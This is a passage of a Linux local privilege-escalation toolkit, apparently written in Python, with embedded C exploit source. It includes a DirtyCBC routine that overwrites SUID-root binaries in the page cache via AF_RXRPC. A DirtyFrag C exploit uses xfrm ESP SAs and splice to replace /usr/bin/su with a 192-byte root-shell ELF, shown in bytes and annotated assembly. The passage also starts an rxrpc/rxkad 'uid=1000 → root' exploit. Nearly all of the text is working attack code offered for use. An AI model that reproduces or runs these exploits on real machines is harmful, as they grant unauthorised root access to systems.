        os.close(tfd)

    return True


def _dirtycbc_overwrite_binary(target, srv, sec_idx=6):
    """Overwrite target SUID binary with 192-byte ELF via DirtyCBC."""
    total_blocks = 12
    blocks_per_batch = 6
    nbatches = (total_blocks + blocks_per_batch - 1) // blocks_per_batch

    _dirtycbc_charge(srv, nbatches + 1)

    with open(target, "rb") as f:
        f.read(4096)

    for b in range(nbatches):
        start_block = b * blocks_per_batch
        batch_blocks = min(blocks_per_batch, total_blocks - start_block)
        batch_chosen = _DIRTYCBC_ELF[16 * start_block: 16 * (start_block + batch_blocks)]
        batch_off = 16 * start_block
        if not _dirtycbc_attack_batch(target, batch_chosen, batch_off, sec_idx):
            return False

    chosen_len = 16 * total_blocks
    with open(target, "rb") as f:
        got = f.read(chosen_len)
    return got == _DIRTYCBC_ELF[:chosen_len]


def _dirtycbc_diag():
    """Print diagnostics when rxrpc_s key type fails."""
    try:
        with open("/proc/modules", "r") as f:
            mods = f.read()
        rxmods = [l.split()[0] for l in mods.splitlines()
                  if "rxrpc" in l or "rxgk" in l or "rxkad" in l]
        if rxmods:
            log("    loaded modules: %s" % ", ".join(rxmods))
        else:
            log("    no rxrpc/rxgk/rxkad modules loaded")
    except (OSError, PermissionError):
        log("    /proc/modules unreadable")

    try:
        r = subprocess.run(["modprobe", "--show-depends", "rxgk"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            log("    rxgk module exists but not loaded — try: modprobe rxgk")
        else:
            log("    rxgk module not available in this kernel")
    except Exception:
        pass

    try:
        r = subprocess.run(["modprobe", "--show-depends", "rxkad"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            log("    rxkad module exists — might work with sec_idx=2")
    except Exception:
        pass

    try:
        with open("/proc/net/rxrpc/security", "r") as f:
            sec = f.read().strip()
            log("    /proc/net/rxrpc/security: %s" % sec)
    except (OSError, PermissionError):
        pass

    uname = os.uname()
    log("    kernel: %s %s" % (uname.release, uname.machine))


# ──────────────────────────────────────────────────
# METHOD 3: DirtyCBC Binary Mutation (all SUID)
# ──────────────────────────────────────────────────

def try_dirtycbc():
    log("\n[=== METHOD 3: DirtyCBC Binary Mutation (RxGK) ===]")

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    if socket is None:
        log("[-] socket module unavailable")
        return False

    # Check AF_RXRPC support
    rxrpc_ok = False
    try:
        qrun(["modprobe", "rxrpc"], timeout=3)
        probe = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
        probe.close()
        rxrpc_ok = True
    except OSError as e:
        log("[-] AF_RXRPC unavailable: %s" % e)

    if not rxrpc_ok:
        for mod in ["af_rxrpc", "rxrpc", "rxkad", "rxgk"]:
            qrun(["modprobe", mod], timeout=3)
        try:
            probe = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
            probe.close()
            rxrpc_ok = True
        except OSError:
            pass

    if not rxrpc_ok:
        log("[-] AF_RXRPC (net-pf-33) not available — skipping DirtyCBC")
        return False

    if not _dirtycbc_init():
        log("[-] libcrypto.so not found — skipping DirtyCBC")
        return False

    log("[+] DirtyCBC initialized: libcrypto OK, AF_RXRPC OK")

    # Force-load rxrpc_s key type before setup
    _trigger_rxrpc_key_type()
    _test_rxrpc_key_type()

    try:
        kr, sec_idx = _dirtycbc_setup_keyring()
        log("[+] Keyring ready (sec_idx=%d)" % sec_idx)
    except OSError as e:
        log("[-] Keyring setup failed: [Errno %d] %s" % (e.errno if e.errno else 0, e))
        if e.errno == 65:
            log("    rxrpc_s key type not registered — kernel lacks CONFIG_RXGK/CONFIG_RXKAD")
            log("    checking /proc/crypto + /proc/modules...")
            _dirtycbc_diag()
        return False

    try:
        srv = _dirtycbc_open_server()
    except OSError as e:
        log("[-] AF_RXRPC bind failed: %s" % e)
        return False

    suids = find_all_suid()
    if not suids:
        srv.close()
        log("[-] No readable SUID-root binaries")
        return False

    log("[+] %d SUID candidates" % len(suids))

    for idx, target in enumerate(suids):
        log("\n  [%d/%d] %s" % (idx + 1, len(suids), target))

        try:
            # Recharge accept pool for this target
            _dirtycbc_charge(srv, 4)
            if _dirtycbc_overwrite_binary(target, srv, sec_idx):
                log("    [+++] Page cache VERIFIED — %s is DirtyCBC payload" % target)
                srv.close()
                auto_root_exec(target)
                return True
            else:
                log("    [-] Verify mismatch — trying next")
        except OSError as e:
            log("    [-] Error: %s" % e)
            continue
        except Exception as e:
            log("    [-] %s: %s" % (type(e).__name__, e))
            continue

    srv.close()
    log("\n[-] Exhausted all %d SUID binaries with DirtyCBC" % len(suids))
    return False


# ──────────────────────────────────────────────────
# METHOD 4: DirtyFrag (ESP + RxRPC auto-chain)
# ──────────────────────────────────────────────────

# ═══════════════════════════════════════════════════════════════
# ▼▼▼ TEMPEL SOURCE C DIRTYFRAG DI SINI ▼▼▼
# ═══════════════════════════════════════════════════════════════
#
# Ganti baris kosong di bawah dengan source C dirtyfrag lengkap.
# Gunakan format raw string triple-quote persis seperti ini:
#
# DIRTYFRAG_C_SOURCE = r'''
# <tempel source C di sini>
# '''
#
# CATATAN:
# - Jangan ubah r''' dan ''' penutup
# - Pastikan di dalam source C tidak ada r''' atau ''' yang bisa
#   memutus string
# - Kalau ada, ganti delimiter jadi r""" dan """
#
DIRTYFRAG_C_SOURCE = r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define TARGET_PATH      "/usr/bin/su"
#define PATCH_OFFSET     0              /* overwrite whole ELF starting at file[0] */
#define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48 triggers) */
#define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */

/*
 * 192-byte minimal x86_64 root-shell ELF.
 *   _start at 0x400078:
 *     setgid(0); setuid(0); setgroups(0, NULL);
 *     execve("/bin/sh", NULL, ["TERM=xterm", NULL]);
 *   PT_LOAD covers 0xb8 bytes (the actual content) at vaddr 0x400000 R+X.
 *
 *   Setting TERM in the new shell's env silences the
 *   "tput: No value for $TERM" / "test: : integer expected" noise
 *   /etc/bash.bashrc and friends emit when TERM is unset.
 *
 * Code (from offset 0x78):
 *   31 ff               xor edi, edi
 *   31 f6               xor esi, esi
 *   31 c0               xor eax, eax
 *   b0 6a               mov al, 0x6a              ; setgid
 *   0f 05               syscall
 *   b0 69               mov al, 0x69              ; setuid
 *   0f 05               syscall
 *   b0 74               mov al, 0x74              ; setgroups
 *   0f 05               syscall
 *   6a 00               push 0                    ; envp[1] = NULL
 *   48 8d 05 12 00 00 00 lea rax, [rip+0x12]      ; rax = "TERM=xterm"
 *   50                  push rax                  ; envp[0]
 *   48 89 e2            mov rdx, rsp              ; rdx = envp
 *   48 8d 3d 12 00 00 00 lea rdi, [rip+0x12]      ; rdi = "/bin/sh"
 *   31 f6               xor esi, esi              ; rsi = NULL (argv)
 *   6a 3b 58            push 0x3b ; pop rax       ; rax = 59 (execve)
 *   0f 05               syscall                   ; execve("/bin/sh",NULL,envp)
 *   "TERM=xterm\0"      (offset 0xa5..0xaf)
 *   "/bin/sh\0"         (offset 0xb0..0xb7)
 */
static const uint8_t shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

extern int g_su_verbose;
int g_su_verbose = 0;
#define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)

static int write_proc(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	int n = write(fd, buf, strlen(buf));
	close(fd);
	return n;
}

static void setup_userns_netns(void)
{
	uid_t real_uid = getuid();
	gid_t real_gid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		SLOG("unshare: %s", strerror(errno));
		exit(1);
	}
	write_proc("/proc/self/setgroups", "deny");
	char map[64];
	snprintf(map, sizeof(map), "0 %u 1", real_uid);
	if (write_proc("/proc/self/uid_map", map) < 0) {
		SLOG("uid_map: %s", strerror(errno)); exit(1);
	}
	snprintf(map, sizeof(map), "0 %u 1", real_gid);
	if (write_proc("/proc/self/gid_map", map) < 0) {
		SLOG("gid_map: %s", strerror(errno)); exit(1);
	}
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { SLOG("socket: %s", strerror(errno)); exit(1); }
	struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { SLOG("SIOCGIFFLAGS: %s", strerror(errno)); exit(1); }
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { SLOG("SIOCSIFFLAGS: %s", strerror(errno)); exit(1); }
	close(s);
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len  = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (sk < 0) return -1;
	struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
	if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

	char buf[4096] = {0};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid   = getpid();
	nlh->nlmsg_seq   = 1;
	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	xs->id.daddr.a4 = inet_addr("127.0.0.1");
	xs->id.spi      = htonl(spi);
	xs->id.proto    = IPPROTO_ESP;
	xs->saddr.a4    = inet_addr("127.0.0.1");
	xs->family      = AF_INET;
	xs->mode        = XFRM_MODE_TRANSPORT;
	xs->replay_window = 0;
	xs->reqid       = 0x1234;
	xs->flags       = XFRM_STATE_ESN;
	xs->lft.soft_byte_limit   = (uint64_t)-1;
	xs->lft.hard_byte_limit   = (uint64_t)-1;
	xs->lft.soft_packet_limit = (uint64_t)-1;
	xs->lft.hard_packet_limit = (uint64_t)-1;
	xs->sel.family  = AF_INET;
	xs->sel.prefixlen_d = 32;
	xs->sel.prefixlen_s = 32;
	xs->sel.daddr.a4 = inet_addr("127.0.0.1");
	xs->sel.saddr.a4 = inet_addr("127.0.0.1");

	{
		char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
		strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
		aa->alg_key_len   = 32 * 8;
		aa->alg_trunc_len = 128;
		memset(aa->alg_key, 0xAA, 32);
		put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
	}
	{
		char alg_buf[sizeof(struct xfrm_algo) + 16];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
		ea->alg_key_len = 16 * 8;
		memset(ea->alg_key, 0xBB, 16);
		put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
	}
	{
		struct xfrm_encap_tmpl enc;
		memset(&enc, 0, sizeof(enc));
		enc.encap_type  = UDP_ENCAP_ESPINUDP;
		enc.encap_sport = htons(ENC_PORT);
		enc.encap_dport = htons(ENC_PORT);
		enc.encap_oa.a4 = 0;
		put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
	}
	{
		char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
		memset(esn_buf, 0, sizeof(esn_buf));
		struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
		esn->bmp_len       = 1;
		esn->oseq          = 0;
		esn->seq           = REPLAY_SEQ;
		esn->oseq_hi       = 0;
		esn->seq_hi        = patch_seqhi;
		esn->replay_window = 32;
		put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
	}

	if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
	char rbuf[4096];
	int n = recv(sk, rbuf, sizeof(rbuf), 0);
	if (n < 0) { close(sk); return -1; }
	struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
	if (rh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = NLMSG_DATA(rh);
		if (e->error) { close(sk); return -1; }
	}
	close(sk);
	return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
	int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_recv < 0) return -1;
	int one = 1;
	setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	struct sockaddr_in sa_d = {
		.sin_family = AF_INET,
		.sin_port   = htons(ENC_PORT),
		.sin_addr   = { inet_addr("127.0.0.1") },
	};
	if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		close(sk_recv); return -1;
	}
	int encap = UDP_ENCAP_ESPINUDP;
	if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
		close(sk_recv); return -1;
	}
	int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_send < 0) { close(sk_recv); return -1; }
	if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		close(sk_send); close(sk_recv); return -1;
	}
	int file_fd = open(path, O_RDONLY);
	if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

	int pfd[2];
	if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

	uint8_t hdr[24];
	*(uint32_t*)(hdr + 0) = htonl(spi);
	*(uint32_t*)(hdr + 4) = htonl(SEQ_VAL);
	memset(hdr + 8, 0xCC, 16);

	struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
	if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
		close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
	}
	off_t off = offset;
	ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
	if (s != 16) {
		close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
	}
	s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
	/* still proceed regardless of splice rc — kernel may have already
	 * decrypted the page in the time between splice and recv */
	usleep(150 * 1000);

	close(file_fd); close(pfd[0]); close(pfd[1]);
	close(sk_send); close(sk_recv);
	return s == 40 ? 0 : -1;
}

static int verify_byte(const char *path, off_t offset, uint8_t want)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0) return -1;
	uint8_t got;
	if (pread(fd, &got, 1, offset) != 1) { close(fd); return -1; }
	close(fd);
	return got == want ? 0 : -1;
}

static int corrupt_su(void)
{
	setup_userns_netns();
	usleep(100 * 1000);

	/* Install 40 xfrm SAs, one per 4-byte chunk.  Each carries the
	 * desired payload word in its seq_hi field. */
	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
		uint32_t spi = 0xDEADBE10 + i;
		uint32_t seqhi =
			((uint32_t)shell_elf[i*4 + 0] << 24) |
			((uint32_t)shell_elf[i*4 + 1] << 16) |
			((uint32_t)shell_elf[i*4 + 2] <<  8) |
			((uint32_t)shell_elf[i*4 + 3]);
		if (add_xfrm_sa(spi, seqhi) < 0) {
			SLOG("add_xfrm_sa #%d failed", i);
			return -1;
		}
	}
	SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);

	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
		uint32_t spi = 0xDEADBE10 + i;
		off_t off = PATCH_OFFSET + i * 4;
		if (do_one_write(TARGET_PATH, off, spi) < 0) {
			SLOG("do_one_write #%d at off=0x%lx failed", i, (long)off);
			return -1;
		}
	}
	SLOG("wrote %d bytes to %s starting at 0x%x",
			PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
	return 0;
}

int su_lpe_main(int argc, char **argv)
{
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
			g_su_verbose = 1;
		else if (!strcmp(argv[i], "--corrupt-only"))
			; /* compat: this body always corrupts only */
	}
	if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;

	pid_t cpid = fork();
	if (cpid < 0) return 1;
	if (cpid == 0) {
		int rc = corrupt_su();
		_exit(rc == 0 ? 0 : 2);
	}
	int cstatus;
	waitpid(cpid, &cstatus, 0);
	if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
		SLOG("corruption stage failed (status=0x%x)", cstatus);
		return 1;
	}

	/* Sanity check: bytes at the embedded ELF entry (file offset 0x78
	 * after our overwrite) should be 0x31 0xff (xor edi, edi — first
	 * instruction of the new shellcode). */
	if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
			verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
		SLOG("post-write verify failed (target unchanged)");
		return 1;
	}
	SLOG("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
			ENTRY_OFFSET);
	return 0;
}
/*
 * rxrpc/rxkad LPE — uid=1000 → root
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <poll.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>
#include <linux/if_alg.h>
#include <net/if.h>
#include <termios.h>

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000000
#endif

/* ---- rxrpc constants ---- */
#define RXRPC_PACKET_TYPE_DATA          1
#define RXRPC_PACKET_TYPE_ACK           2
#define RXRPC_PACKET_TYPE_ABORT         4
#define RXRPC_PACKET_TYPE_CHALLENGE     6
#define RXRPC_PACKET_TYPE_RESPONSE      7
#define RXRPC_CLIENT_INITIATED          0x01
#define RXRPC_REQUEST_ACK               0x02
#define RXRPC_LAST_PACKET               0x04
#define RXRPC_CHANNELMASK               3
#define RXRPC_CIDSHIFT                  2

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t  type;
	uint8_t  flags;
	uint8_t  userStatus;
	uint8_t  securityIndex;
	uint16_t cksum;        /* big-endian on wire */
	uint16_t serviceId;
} __attribute__((packed));

struct rxkad_challenge {
	uint32_t version;
	uint32_t nonce;
	uint32_t min_level;
	uint32_t __padding;
} __attribute__((packed));

/* Attacker-chosen 8-byte session key used for the rxkad token.
 * Mutable because the LPE brute-force iterates over keys looking for
 * one that decrypts the file's UID field to a "0:" prefix. */
static uint8_t SESSION_KEY[8] = {
	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
};

#define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define DBG(fmt, ...) fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__)

/* =================================================================== */
/* unshare + map setup                                                  */
/* =================================================================== */

static int write_file(const char *path, const char *fmt, ...)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	char buf[256]; va_list ap; va_start(ap, fmt);
	int n = vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
	int r = (int)write(fd, buf, n); close(fd);
	return r;
}

static int do_unshare_userns_netns(void)
{
	uid_t real_uid = getuid();
	gid_t real_gid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		WARN("unshare(NEWUSER|NEWNET): %s", strerror(errno));
		return -1;
	}
	LOG("unshare(USER|NET) OK, real uid=%u", real_uid);
	write_file("/proc/self/setgroups", "deny");
	if (write_file("/proc/self/uid_map", "%u %u 1", real_uid, real_uid) < 0) {
		WARN("uid_map: %s", strerror(errno)); return -1;
	}
	if (write_file("/proc/self/gid_map", "%u %u 1", real_gid, real_gid) < 0) {
		WARN("gid_map: %s", strerror(errno)); return -1;
	}
	LOG("uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within netns",
			real_uid, real_gid);

	/* ifup lo */
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s >= 0) {
		struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
		strcpy(ifr.ifr_name, "lo");
		if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
			ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
			if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
				WARN("SIOCSIFFLAGS lo: %s", strerror(errno));
			else
				LOG("lo brought UP in new netns");
		}
		close(s);
	}
	return 0;
}

/* =================================================================== */
/* rxrpc key (rxkad v1 token with attacker session key)                 */
/* =================================================================== */

static long key_add(const char *type, const char *desc,
		const void *payload, size_t plen, int ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
{
	uint8_t *p = out;
	uint32_t now = (uint32_t)time(NULL);
	uint32_t expires = now + 86400;
	*(uint32_t *)p = htonl(0); p += 4;   /* flags */
	const char *cell = "evil";
	uint32_t clen = strlen(cell);
	*(uint32_t *)p = htonl(clen); p += 4;
	memcpy(p, cell, clen);
	uint32_t pad = (4 - (clen & 3)) & 3;
	memset(p + clen, 0, pad);
	p += clen + pad;
	*(uint32_t *)p = htonl(1); p += 4;   /* ntoken */
	uint8_t *toklen_p = p; p += 4;
	uint8_t *tokstart = p;
	*(uint32_t *)p = htonl(2); p += 4;   /* sec_ix = RXKAD */
	*(uint32_t *)p = htonl(0); p += 4;   /* vice_id */
	*(uint32_t *)p = htonl(1); p += 4;   /* kvno */
	memcpy(p, SESSION_KEY, 8); p += 8;   /* session_key K */
	*(uint32_t *)p = htonl(now); p += 4;
	*(uint32_t *)p = htonl(expires); p += 4;
	*(uint32_t *)p = htonl(1); p += 4;   /* primary_flag */
	*(uint32_t *)p = htonl(8); p += 4;   /* ticket_len */
	memset(p, 0xCC, 8); p += 8;          /* ticket */
	uint32_t toklen = (uint32_t)(p - tokstart);
	*(uint32_t *)toklen_p = htonl(toklen);
	if ((size_t)(p - out) > maxlen) { errno = E2BIG; return -1; }
	return (int)(p - out);
}

static long add_rxrpc_key(const char *desc)
{
	uint8_t buf[512];
	int n = build_rxrpc_v1_token(buf, sizeof(buf));
	if (n < 0) return -1;
	return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

/* =================================================================== */
/* AF_ALG pcbc(fcrypt) helpers                                          */
/* =================================================================== */

static int alg_open_pcbc_fcrypt(const uint8_t key[8])
{
	int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (s < 0) { WARN("socket(AF_ALG): %s", strerror(errno)); return -1; }
	struct sockaddr_alg sa = { .salg_family = AF_ALG };
	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("bind(AF_ALG pcbc(fcrypt)): %s", strerror(errno));
		close(s); return -1;
	}
	if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) {
		WARN("ALG_SET_KEY: %s", strerror(errno));
		close(s); return -1;
	}
	return s;
}

/* Encrypt-or-decrypt a 1+ block of data with a given IV. */
static int alg_op(int alg_s, int op, const uint8_t iv[8],
		const void *in, size_t inlen, void *out)
{
	int op_fd = accept(alg_s, NULL, NULL);
	if (op_fd < 0) { WARN("accept(AF_ALG): %s", strerror(errno)); return -1; }

	char cbuf[CMSG_SPACE(sizeof(int)) +
		CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = {0};
	struct msghdr msg = {0};
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_OP;
	c->cmsg_len = CMSG_LEN(sizeof(int));
	*(int *)CMSG_DATA(c) = op;

	c = CMSG_NXTHDR(&msg, c);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_IV;
	c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
	struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
	aiv->ivlen = 8;
	memcpy(aiv->iv, iv, 8);

	struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;

	if (sendmsg(op_fd, &msg, 0) < 0) {
		WARN("AF_ALG sendmsg: %s", strerror(errno));
		close(op_fd); return -1;
	}
	ssize_t n = read(op_fd, out, inlen);
	close(op_fd);
	if (n != (ssize_t)inlen) {
		WARN("AF_ALG read got %zd want %zu: %s",
				n, inlen, strerror(errno));
		return -1;
	}
	return 0;
}

/* Compute conn->rxkad.csum_iv (ref: rxkad_prime_packet_security):
 *   tmpbuf[0..3] = htonl(epoch, cid, 0, security_ix)  (16 B)
 *   PCBC-encrypt(tmpbuf, IV=session_key) → out[16]
 *   csum_iv = out[8..15]   (last 8 B = "tmpbuf[2..3]" after encryption)
 */
static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
		const uint8_t key[8], uint8_t csum_iv[8])
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
	uint8_t  out[16];
	int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
	close(s);
	if (rc < 0) return -1;
	memcpy(csum_iv, out + 8, 8);
	return 0;
}

/* Compute the wire cksum (ref: rxkad_secure_packet @rxkad.c:342):
 *   x = (cid_low2 << 30) | (seq & 0x3fffffff)
 *   buf[0] = htonl(call_id), buf[1] = htonl(x)    (8 B)
 *   PCBC-encrypt(buf, IV=csum_iv) → enc[8]
